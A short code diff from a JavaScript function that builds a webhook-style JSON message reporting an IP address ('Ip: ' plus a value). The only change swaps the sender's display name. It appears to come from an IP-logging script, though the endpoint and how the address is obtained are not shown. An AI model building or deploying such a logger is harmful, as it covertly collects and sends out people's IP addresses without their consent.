@@ -12,7 +12,7 @@ function sendMessage(ipText) {
     request.setRequestHeader('Content-type', 'application/json');
 
     const params = {
-      username: "Herremann",
+      username: "NaN",
       avatar_url: "",
       content: "Ip: " + ipText
     }
